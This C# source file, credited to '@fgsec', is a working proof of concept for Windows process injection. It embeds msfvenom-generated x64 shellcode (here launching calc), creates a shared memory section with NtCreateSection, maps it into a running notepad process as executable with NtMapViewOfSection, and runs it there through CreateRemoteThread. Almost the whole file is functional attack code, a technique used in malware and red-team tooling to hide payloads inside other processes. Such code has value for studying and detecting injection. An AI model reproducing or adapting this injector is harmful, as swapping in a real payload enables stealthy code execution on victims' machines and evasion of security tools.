using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;

/* 

Author: @fgsec
NativeAPI Code Injection with NtCreateSection and NtMapViewOfSection.

*/

namespace ProcessInjection { 
	class Program {

		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
		static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

		[StructLayout(LayoutKind.Explicit, Size = 8)]
		struct LARGE_INTEGER {
			[FieldOffset(0)] public Int64 QuadPart;
			[FieldOffset(0)] public UInt32 LowPart;
			[FieldOffset(4)] public Int32 HighPart;
		}

		[DllImport("ntdll.dll", SetLastError = true)]
		static extern UInt32 NtCreateSection(
		ref IntPtr SectionHandle,
		UInt32 DesiredAccess,
		IntPtr ObjectAttributes,
		ref LARGE_INTEGER MaximumSize,
		UInt32 SectionPageProtection,
		UInt32 AllocationAttributes,
		IntPtr FileHandle);

		[DllImport("ntdll.dll", SetLastError = true)]
		static extern uint NtMapViewOfSection(
		IntPtr SectionHandle,
		IntPtr ProcessHandle,
		ref IntPtr BaseAddress,
		UIntPtr ZeroBits,
		UIntPtr CommitSize,
		out ulong SectionOffset,
		out uint ViewSize,
		uint InheritDisposition,
		uint AllocationType,
		uint Win32Protect);

		[DllImport("ntdll.dll", SetLastError = true)]
		static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

		[DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
		static extern int NtClose(IntPtr hObject);

		[Flags]
		public enum SECTION : UInt32 {
			SECTION_QUERY = 0x0001,
			SECTION_MAP_WRITE = 0x0002,
			SECTION_MAP_READ = 0x0004,
			SECTION_MAP_EXECUTE = 0x0008,
			SECTION_EXTEND_SIZE = 0x0010,
			SECTION_MAP_EXECUTE_EXPLICIT = 0x0020, // not included in SECTION_ALL_ACCESS
			STANDARD_RIGHTS_REQUIRED = 0x000F0000,
			SECTION_ALL_ACCESS = STANDARD_RIGHTS_REQUIRED | SECTION_QUERY | SECTION_MAP_WRITE | SECTION_MAP_READ | SECTION_MAP_EXECUTE | SECTION_EXTEND_SIZE
		}

		[DllImport("kernel32.dll")]
		static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

		[DllImport("ntdll.dll", SetLastError = true)]
		static extern int ZwCreateThreadEx(ref IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool inCreateSuspended, Int32 stackZeroBits, Int32 sizeOfStack, Int32 maximumStackSize, IntPtr attributeList);

		[DllImport("kernel32")]
		public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, int dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, int dwCreationFlags, out IntPtr lpThreadId);

		// https://www.pinvoke.net/default.aspx/Enums.ACCESS_MASK
		static void Main(string[] args) {

                //msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -f csharp
			byte[] buf = new byte[272] {
			0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
			0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
			0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
			0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
			0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
			0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
			0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
			0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
			0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
			0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
			0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
			0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
			0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
			0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
			0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
			0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
			0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
			0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
			0x63,0x00 };

			LARGE_INTEGER maxSize = new LARGE_INTEGER();
			IntPtr sectionhandle = IntPtr.Zero;

			maxSize.HighPart = 0;
			maxSize.LowPart = 0x1000;

			// Create Memory Section
			uint result = NtCreateSection(ref sectionhandle, 0x0001 | 0x0002 | 0x0004 | 0x0008 | 0x0010 | 0x0020 | 0x000F0000, IntPtr.Zero, ref maxSize, 0x40, 0x8000000, IntPtr.Zero);
			if(result == 0) {
				Console.WriteLine(String.Format("CreateSection - Handle: {0:X}", sectionhandle.ToInt64()));
			}

			// NtMapViewOfSection - RW
			IntPtr sectionBaseAddress = IntPtr.Zero;
			uint viewSize = 0;
			ulong ox = 0;
			UIntPtr v = (UIntPtr)0;
			
			result = NtMapViewOfSection(sectionhandle, Process.GetCurrentProcess().Handle, ref sectionBaseAddress, v, v, out ox, out viewSize, 0x2, 0, 0x4);
			if (result == 0) {
				Console.WriteLine(String.Format("NtMapViewOfSection - RW OK: {0:X}", sectionBaseAddress.ToInt64()));
			}

			Console.WriteLine("Copying shellcode into section...");
			Marshal.Copy(buf, 0, sectionBaseAddress, buf.Length);
			Console.WriteLine("Shell Code size: {0} ", buf.Length);

			Process processtarget = Process.GetProcessesByName("notepad")[0];

			// NtMapViewOfSection - RX
			IntPtr sectionBaseAddress2 = IntPtr.Zero;
			result = NtMapViewOfSection(sectionhandle, processtarget.Handle, ref sectionBaseAddress2, v, v, out ox, out viewSize, 0x2, 0, 0x20);
			if (result == 0) {
				Console.WriteLine(String.Format("NtMapViewOfSection - RX OK: {0:X}", sectionBaseAddress2.ToInt64()));
			}

			
			result = NtUnmapViewOfSection(Process.GetCurrentProcess().Handle, sectionBaseAddress);
			if (result == 0) {
				Console.WriteLine("NtUnmapViewOfSection - OK");
			}

			IntPtr bytesout;
			IntPtr modulePath = CreateRemoteThread(processtarget.Handle, IntPtr.Zero, 0, sectionBaseAddress2, IntPtr.Zero, 0, out bytesout);
			Console.WriteLine(String.Format("CreateRemoteThread = {0:X}", modulePath.ToInt32()));

			Console.ReadKey();
			

		}
	}
}
